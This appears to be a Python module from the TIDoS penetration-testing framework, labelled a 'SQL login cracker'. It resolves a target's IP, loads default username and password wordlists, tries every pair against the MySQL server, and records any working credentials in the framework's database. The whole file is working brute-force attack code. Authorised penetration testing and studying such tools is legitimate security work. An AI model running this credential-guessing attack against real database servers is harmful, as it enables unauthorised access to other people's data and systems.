#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#-:-:-:-:-:-:-:-:-:-:-:-:#
#    TIDoS Framework     #
#-:-:-:-:-:-:-:-:-:-:-:-:#

#This module requires TIDoS Framework
#https://github.com/0xInfection/TIDoS-Framework


import time
import socket
from core.Core.colors import *
import mysql.connector as mysql
from core.database.database_module import save_data
from core.variables import database
from core.methods.cache import targetname
import inspect

sqluser = []
sqlpass = []

searchinfo = "SQL login cracker"
info = "Crack database credentials using dictionaries."
properties = {}

def bruter(user, passwd, ip, flag=False):
    try:
        con = mysql.connect(user=user, password=passwd, host=ip)
        flag = True
    except Exception:
        pass
    return flag

def sqlbrute(web):
    global name
    name = targetname(web)
    global lvl2
    lvl2 = inspect.stack()[0][3]
    global module
    module = "VulnAnalysis"
    global lvl1
    lvl1 = "Brute Force Tools"
    global lvl3
    lvl3 = ""
    #print(R+'\n   ===============================')
    #print(R+'\n    S Q L   B R U T E F O R C E R')
    #print(R+'   ---<>----<>----<>----<>----<>--\n')
    from core.methods.print import pbrute
    pbrute("sql")
    try:
        print(GR+' [*] Testing target...')
        ip = socket.gethostbyname(web.split('//')[1])
        m = input(O+' [§] Use IP '+R+str(ip)+O+'? (y/n) :> ')
        if m == 'y' or m == 'Y':
            pass
        elif m == 'n' or m == 'N':
            ip = input(O+' [§] Enter IP :> ')

        print(G+' [+] Target appears online...')

        try:
            with open('files/brute-db/sql/sql_defuser.lst','r') as users:
                for u in users:
                    u = u.strip('\n')
                    sqluser.append(u)

            with open('files/brute-db/sql/sql_defpass.lst','r') as pas:
                for p in pas:
                    p = p.strip('\n')
                    sqlpass.append(p)
        except IOError:
            print(R+' [-] Importing wordlist failed!')

        found = False
        for user in sqluser:
            for password in sqlpass:
                print(C+' [!] Checking '+B+user+C+' and '+B+password+'...')
                res = bruter(user, password, ip)
                if res:
                    found = True
                    data = user + " : " + password
                    save_data(database, module, lvl1, lvl2, lvl3, name, data)
                    print(G+' [!] Successful login with ' +O+user+G+ ' and ' +O+password)
                    break
                else:
                    continue
        if not found:
            data = "Nothing found."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)
            
    except socket.gaierror:
        print(R+' [-] Target seems to be down!')
    except KeyboardInterrupt:
        if not found:
            data = "Nothing found."
            save_data(database, module, lvl1, lvl2, lvl3, name, data)

def attack(web):
    web = web.fullurl
    sqlbrute(web)
